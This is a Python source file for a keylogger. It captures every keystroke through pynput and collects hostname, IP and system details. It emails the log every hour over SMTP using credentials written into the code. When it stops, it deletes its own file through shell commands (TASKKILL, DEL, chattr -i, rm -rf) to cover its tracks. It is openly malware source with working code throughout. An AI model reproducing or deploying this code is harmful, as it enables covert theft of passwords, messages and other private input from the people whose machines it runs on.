import os
import platform
import smtplib
import socket
import threading
from pynput import keyboard

EMAIL_ADDRESS = "990ab68b3c2440"
EMAIL_PASSWORD = "e0d59dc2b285fa"
SEND_REPORT_EVERY = 3600  # as in seconds


class KeyLogger:
    """
    A class used to represent a KeyLogger.
    Attributes
    ----------
    interval : int
        The time interval in seconds for reporting the logged keys.
    log : str
        The string that stores the logged keys.
    email : str
        The email address to send the logged keys to.
    password : str
        The password for the email account used to send the logged keys.
    Methods
    -------
    appendlog(string)
        Appends a string to the log.
    save_data(key)
        Saves the key data to the log.
    send_mail(email, password, message)
        Sends an email with the logged keys.
    report()
        Sends the logged keys via email and resets the log.
    system_information()
        Logs system information such as hostname, IP, processor & system.
    run()
        Starts the keylogger and handles the termination of the script.
    """

    def __init__(self, time_interval, email, password):
        """
        Initializes the KeyLogger with the specified time interval, email, and password.

        Args:
            time_interval (int): The interval at which the keylogger sends logs.
            email (str): The email address to send the logs to.
            password (str): The password for the email account.
        """
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        """
        Appends the given string to the log.

        Args:
            string (str): The string to append to the log.
        """
        self.log = self.log + string

    def save_data(self, key):
        """
        Saves the pressed key data.

        This method attempts to convert the pressed key to a string and handles 
        special keys such as space and escape.
        The resulting string representation of the key is then appended to the log.

        Args:
            key: The key object representing the pressed key.

        Raises:
            AttributeError: If the key does not have a 'char' attribute.
        """
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        finally:
            self.appendlog(current_key)

    def send_mail(self, email, password, message):
        """
        Sends an email with the specified message using Mailtrap SMTP server.
        Args:
            email (str): The email address to log in to the SMTP server.
            password (str): The password to log in to the SMTP server.
            message (str): The message to be sent in the email.
        Returns:
            None
        """
        sender = "Private Person <from@example.com>"
        receiver = "A Test User <to@example.com>"

        m = f"""\
        Subject: main Mailtrap
        To: {receiver}
        From: {sender}

        Keys Received\n"""

        m += message
        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.sendmail(sender, receiver, message)

    def report(self):
        """
        Sends the logged data via email and resets the log.

        This method sends the current log data to the specified email address
        using the provided email and password. After sending the email, it
        clears the log and sets a timer to call itself again after a specified
        interval.

        Attributes:
            email (str): The email address to send the log to.
            password (str): The password for the email account used to send the log.
            log (str): The current log data to be sent.
            interval (int): The interval in seconds to wait before calling the report method again.
        """
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        """
        Collects and logs system information including hostname, IP address, processor type, 
        operating system, and machine type.

        This method retrieves the following system information:
        - Hostname: The name of the machine on the network.
        - IP address: The IP address of the machine.
        - Processor: The type of processor in the machine.
        - Operating System: The name of the operating system.
        - Machine: The machine type.

        The collected information is then logged using the appendlog method.
        """
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    def run(self):
        """
        Starts the keylogger and handles the cleanup process upon termination.
        This method initializes a keyboard listener to capture keystrokes and 
        starts the reporting process. Upon termination, it attempts to close 
        and delete the script file itself based on the operating system.
        On Windows:
            - Changes the current working directory.
            - Terminates the script process.
            - Deletes the script file.
        On Unix-based systems:
            - Changes the current working directory.
            - Terminates the 'leafpad' process.
            - Removes the immutable attribute from the script file.
            - Deletes the script file.
        If an OSError occurs during the cleanup process, it prints a message indicating 
        that the file is closed.
        Finally, it reinitializes and runs the keylogger.
        Raises:
            OSError: If an error occurs during the cleanup process.
        """
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print("File was closed.")
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print("File is close.")
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("pkill leafpad")
                os.system("chattr -i " + os.path.basename(__file__))
                print("File was closed.")
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print("File is close.")

        keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
        keylogger.run()
